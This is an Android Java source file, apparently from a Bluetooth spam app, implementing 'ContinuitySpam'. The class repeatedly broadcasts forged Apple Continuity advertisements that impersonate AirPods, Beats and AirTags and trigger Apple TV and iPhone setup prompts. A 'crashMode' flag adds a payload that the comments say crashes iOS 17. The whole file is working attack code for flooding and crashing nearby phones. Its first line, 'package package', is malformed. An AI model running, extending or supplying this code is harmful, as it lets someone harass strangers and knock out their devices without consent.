package package com.tutozz.blespam;

import android.bluetooth.le.AdvertiseData;
import android.os.Handler;
import android.os.Looper;

import java.util.Random;

/**
 * Implements Continuity/Proximity spamming logic using a non-blocking Handler for cycling.
 * Extends the abstract Spammer class.
 */
// 1. EXTENDS Spammer instead of IMPLEMENTS
public class ContinuitySpam extends Spammer {

    // Removed: public Runnable blinkRunnable; (Now inherited from Spammer)
    // Removed: public boolean isSpamming = false; (Now inherited and managed by Spammer)
    // Removed: private int loop = 0; (No longer needed)
    // Removed: ExecutorService executor = Executors.newSingleThreadExecutor(); (No longer needed)
    
    public ContinuityDevice[] devices;
    public boolean crashMode;

    // Handler for scheduling the advertising cycle (must run on Main Looper)
    private final Handler spamHandler = new Handler(Looper.getMainLooper());
    private final BluetoothAdvertiser advertiser = new BluetoothAdvertiser();

    // 2. Define the repeating advertising task
    private final Runnable advertisingRunnable = new Runnable() {
        @Override
        public void run() {
            if (!isSpamming) {
                // Self-terminate if stop() was called while waiting for next run
                return;
            }

            // 3. Spammer Logic (Modified to use Helper methods safely)

            // Random device selection
            // Use ThreadLocal Random from Helper for better practice
            ContinuityDevice device = devices[Helper.RANDOM_THREAD_LOCAL.get().nextInt(devices.length)];
            AdvertiseData data = null;

            // Build Advertisement Data
            if(device.getDeviceType() == ContinuityDevice.type.ACTION){
                // Action Spamming
                String rHex = Helper.randomHexFiller(6);
                String manufacturerData = "0F05C0" + device.getValue() + rHex;
                if(crashMode){ 
                    // Crash Mode: appending extra data (e.g., for iOS 17 crash)
                    manufacturerData = "0F05C0" + device.getValue() + rHex + "000010" + Helper.randomHexFiller(6); 
                }
                data = new AdvertiseData.Builder()
                        .addManufacturerData(0x004C, Helper.convertHexToByteArray(manufacturerData))
                        .build();

            } else if(device.getDeviceType() == ContinuityDevice.type.DEVICE){
                // Device Modal Spamming
                String continuityType = "07";
                String size = "19";
                String prefix = (device.getName().equals("Airtag")) ? "05" : "01";
                
                // Use ThreadLocal Random from Helper for random levels
                Random random = Helper.RANDOM_THREAD_LOCAL.get();
                String budsBatteryLevel = String.format("%02X", random.nextInt(10) * 10 + random.nextInt(10));
                String caseBatteryLevel = String.format("%02X", random.nextInt(8) * 10 + random.nextInt(10));
                String lidOpenCounter = String.format("%02X", random.nextInt(256));
                String filler = Helper.randomHexFiller(32);
                
                data = new AdvertiseData.Builder()
                        // Apple Company ID (0x004C)
                        .addManufacturerData(0x004C, Helper.convertHexToByteArray(
                            continuityType + size + prefix + device.getValue() + "55" + 
                            budsBatteryLevel + caseBatteryLevel + lidOpenCounter + "0000" + filler)
                        )
                        .build();
            }
            
            // 4. Advertise, then immediately stop to prepare for the next cycle
            // NOTE: This relies on an external BluetoothAdvertiser class to handle the stop/start logic
            advertiser.advertise(data, null); 
            advertiser.stopAdvertising();
            
            // 5. Schedule the next run after the user-defined delay
            // We use uiBlinkDelay (the user-controlled setting) to set the advertisement rate.
            spamHandler.postDelayed(this, Helper.uiBlinkDelay);
        }
    };

    // Constructor remains the same
    public ContinuitySpam(ContinuityDevice.type type, boolean crashMode) {
        this.crashMode = crashMode;
        // Init ContinuityDevices
        switch (type) {
            default:
            case DEVICE:
                devices = new ContinuityDevice[]{
                        new ContinuityDevice("0x0E20", "AirPods Pro", ContinuityDevice.type.DEVICE),
                        new ContinuityDevice("0x0620", "Beats Solo 3", ContinuityDevice.type.DEVICE),
                        new ContinuityDevice("0x0A20", "AirPods Max", ContinuityDevice.type.DEVICE),
                        new ContinuityDevice("0x1020", "Beats Flex", ContinuityDevice.type.DEVICE),
                        new ContinuityDevice("0x0055", "Airtag", ContinuityDevice.type.DEVICE),
                        new ContinuityDevice("0x0030", "Hermes Airtag", ContinuityDevice.type.DEVICE),
                        new ContinuityDevice("0x0220", "AirPods", ContinuityDevice.type.DEVICE),
                        new ContinuityDevice("0x0F20", "AirPods 2nd Gen", ContinuityDevice.type.DEVICE),
                        new ContinuityDevice("0x1320", "AirPods 3rd Gen", ContinuityDevice.type.DEVICE),
                        new ContinuityDevice("0x1420", "AirPods Pro 2nd Gen", ContinuityDevice.type.DEVICE),
                        new ContinuityDevice("0x0320", "Powerbeats 3", ContinuityDevice.type.DEVICE),
                        new ContinuityDevice("0x0B20", "Powerbeats Pro", ContinuityDevice.type.DEVICE),
                        new ContinuityDevice("0x0C20", "Beats Solo Pro", ContinuityDevice.type.DEVICE),
                        new ContinuityDevice("0x1120", "Beats Studio Buds", ContinuityDevice.type.DEVICE),
                        new ContinuityDevice("0x0520", "Beats X", ContinuityDevice.type.DEVICE),
                        new ContinuityDevice("0x0920", "Beats Studio 3", ContinuityDevice.type.DEVICE),
                        new ContinuityDevice("0x1720", "Beats Studio Pro", ContinuityDevice.type.DEVICE),
                        new ContinuityDevice("0x1220", "Beats Fit Pro", ContinuityDevice.type.DEVICE),
                        new ContinuityDevice("0x1620", "Beats Studio Buds+", ContinuityDevice.type.DEVICE)
                };
                break;
            case ACTION:
                devices = new ContinuityDevice[]{
                        new ContinuityDevice("0x13", "AppleTV AutoFill", ContinuityDevice.type.ACTION),
                        new ContinuityDevice("0x27", "AppleTV Connecting...", ContinuityDevice.type.ACTION),
                        new ContinuityDevice("0x20", "Join This AppleTV?", ContinuityDevice.type.ACTION),
                        new ContinuityDevice("0x19", "AppleTV Audio Sync", ContinuityDevice.type.ACTION),
                        new ContinuityDevice("0x1E", "AppleTV Color Balance", ContinuityDevice.type.ACTION),
                        new ContinuityDevice("0x09", "Setup New iPhone", ContinuityDevice.type.ACTION),
                        new ContinuityDevice("0x02", "Transfer Phone Number", ContinuityDevice.type.ACTION),
                        new ContinuityDevice("0x0B", "HomePod Setup", ContinuityDevice.type.ACTION),
                        new ContinuityDevice("0x01", "Setup New AppleTV", ContinuityDevice.type.ACTION),
                        new ContinuityDevice("0x06", "Pair AppleTV", ContinuityDevice.type.ACTION),
                        new ContinuityDevice("0x0D", "HomeKit AppleTV Setup", ContinuityDevice.type.ACTION),
                        new ContinuityDevice("0x2B", "AppleID for AppleTV?", ContinuityDevice.type.ACTION)
                };
                break;
        }
    }

    // 3. Implements abstract start() method
    @Override
    public void start() {
        if (isSpamming) return;

        // Use the inherited field
        isSpamming = true;
        
        // Start the first advertising cycle immediately
        spamHandler.post(advertisingRunnable);
    }

    // 4. Implements abstract stop() method
    @Override
    public void stop() {
        if (!isSpamming) return;

        // Stop the scheduling immediately
        spamHandler.removeCallbacks(advertisingRunnable);

        // Stop the currently running advertisement
        advertiser.stopAdvertising();
        
        // Use the inherited field
        isSpamming = false;
        
        // Removed: loop = Helper.MAX_LOOP+1; (No longer needed)
    }

    // 5. Removed: isSpamming(), getBlinkRunnable(), setBlinkRunnable() 
    // These methods are now handled by the inherited methods/fields of the abstract Spammer class.
}
